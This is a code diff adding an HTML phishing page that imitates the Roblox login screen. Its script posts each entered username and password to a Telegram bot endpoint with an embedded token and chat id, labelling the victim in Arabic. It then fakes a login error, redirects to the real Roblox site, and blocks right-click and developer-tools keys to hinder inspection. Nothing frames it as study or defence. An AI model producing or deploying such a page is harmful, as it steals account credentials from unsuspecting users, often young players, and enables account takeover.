@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Roblox</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+html,body{height:100%}
+body{background:#fff;display:flex;flex-direction:column;min-height:100vh;color:#393b3d}
+.topbar{background:#fff;padding:14px 24px;border-bottom:1px solid #e3e5e7;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:26px;font-weight:900;color:#000;letter-spacing:-0.5px}
+.topbar-right{font-size:14px;color:#393b3d}
+.topbar-right a{color:#00a2ff;text-decoration:none}
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;background:#f9fafb}
+.card{background:#fff;border:1px solid #e3e5e7;border-radius:8px;padding:36px;width:100%;max-width:420px}
+.card h1{font-size:28px;font-weight:700;color:#232527;margin-bottom:8px}
+.card .sub{font-size:14px;color:#6e7175;margin-bottom:28px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:13px;color:#393b3d;margin-bottom:6px;font-weight:500}
+.field input{width:100%;padding:12px 14px;border:1px solid #cbcbcb;border-radius:6px;font-size:15px;color:#232527;background:#fff;transition:0.15s}
+.field input:focus{outline:none;border-color:#00a2ff;box-shadow:0 0 0 3px rgba(0,162,255,0.1)}
+.field input::placeholder{color:#b8bbbe}
+.btn{width:100%;padding:14px;background:#00a2ff;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px;transition:background 0.15s}
+.btn:hover{background:#0089d6}
+.forgot{display:block;text-align:center;margin-top:20px;color:#00a2ff;text-decoration:none;font-size:14px}
+.signup{text-align:center;margin-top:24px;padding-top:24px;border-top:1px solid #e3e5e7;font-size:14px;color:#6e7175}
+.signup a{color:#00a2ff;text-decoration:none;font-weight:500}
+.footer{padding:20px;text-align:center;font-size:12px;color:#8b8f93}
+.footer a{color:#8b8f93;text-decoration:none;margin:0 8px}
+.loader{display:none;width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media (max-width:480px){
+    .card{padding:28px 22px}
+    .card h1{font-size:24px}
+    .topbar{padding:12px 16px}
+    .logo{font-size:22px}
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+    <div class="logo">ROBLOX</div>
+    <div class="topbar-right"><a href="#">Sign Up</a></div>
+</div>
+
+<div class="main">
+    <div class="card">
+        <h1>Log In</h1>
+        <p class="sub">Log in to your Roblox account</p>
+
+        <form id="loginForm" onsubmit="return sendData(event)">
+            <div class="field">
+                <label>Username or Email</label>
+                <input type="text" id="u" name="username" placeholder="Username or Email" required autocomplete="username">
+            </div>
+            <div class="field">
+                <label>Password</label>
+                <input type="password" id="p" name="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="btn" id="submitBtn">
+                <span id="btnText">Log In</span>
+                <div class="loader" id="loader"></div>
+            </button>
+        </form>
+
+        <a href="#" class="forgot">Forgot Password or Username?</a>
+        <div class="signup">Don't have an account? <a href="#">Sign Up</a></div>
+    </div>
+</div>
+
+<div class="footer">
+    <a href="#">About Us</a>
+    <a href="#">Terms</a>
+    <a href="#">Privacy</a>
+    <a href="#">Help</a>
+</div>
+
+<script>
+async function sendData(e){
+    e.preventDefault();
+    var u = document.getElementById('u').value.trim();
+    var p = document.getElementById('p').value.trim();
+    if (!u || !p) return false;
+
+    document.getElementById('btnText').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
+    document.getElementById('submitBtn').disabled = true;
+
+    var msg = "🎣 <b>ضحية جديدة</b>\n" +
+              "🎯 الصفحة: gift2\n" +
+              "👤 Username: <code>" + u + "</code>\n" +
+              "🔑 Password: <code>" + p + "</code>\n" +
+              "⏰ " + new Date().toLocaleString('en-GB');
+
+    try {
+        await fetch("https://api.telegram.org/bot8811078908:AAHh5Gy2HMa0sPOcx6AffivgOHE3NbTYz3U/sendMessage", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: "6045243196",
+                text: msg,
+                parse_mode: "HTML"
+            })
+        });
+    } catch(err) { console.log(err); }
+
+    setTimeout(function() {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('btnText').style.display = 'block';
+        document.getElementById('btnText').innerText = 'Invalid username or password';
+        document.getElementById('submitBtn').style.background = '#e2231a';
+        document.getElementById('submitBtn').disabled = false;
+
+        setTimeout(function() {
+            window.location.href = "https://www.roblox.com/login";
+        }, 2500);
+    }, 1200);
+
+    return false;
+}
+
+document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+document.addEventListener('keydown', function(e){
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'u')) { e.preventDefault(); }
+});
+</script>
+</body>
+</html>
